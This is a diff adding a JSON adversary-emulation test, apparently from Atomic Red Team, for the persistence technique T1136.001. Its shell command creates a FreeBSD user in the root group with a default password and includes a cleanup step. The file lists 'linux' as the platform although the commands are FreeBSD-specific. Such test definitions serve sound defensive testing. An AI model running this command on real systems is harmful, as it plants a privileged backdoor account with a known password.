@@ -1,0 +1,36 @@
+{
+    "name": "Create a new user in FreeBSD with `root` GID.",
+    "description": "Creates a new user in FreeBSD and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign. ",
+    "supported_platforms": [
+        "linux"
+    ],
+    "executor": {
+        "command": "pw useradd #{username} -g 0 -d /root -s /bin/sh\necho \"#{password}\" | pw usermod #{username} -h 0\n",
+        "cleanup_command": "pw userdel #{username}\n",
+        "name": "sh",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1136.001",
+    "tactics": [
+        "Persistence"
+    ],
+    "technique": "Local Account",
+    "source": "ART",
+    "uuid": "d141afeb-d2bc-4934-8dd5-b7dba0f9f67a",
+    "arguments": {
+        "username": {
+            "description": "Username of the user to create",
+            "type": "string",
+            "default": "butter"
+        },
+        "password": {
+            "description": "Password of the user to create",
+            "type": "string",
+            "default": "BetterWithButter"
+        }
+    },
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
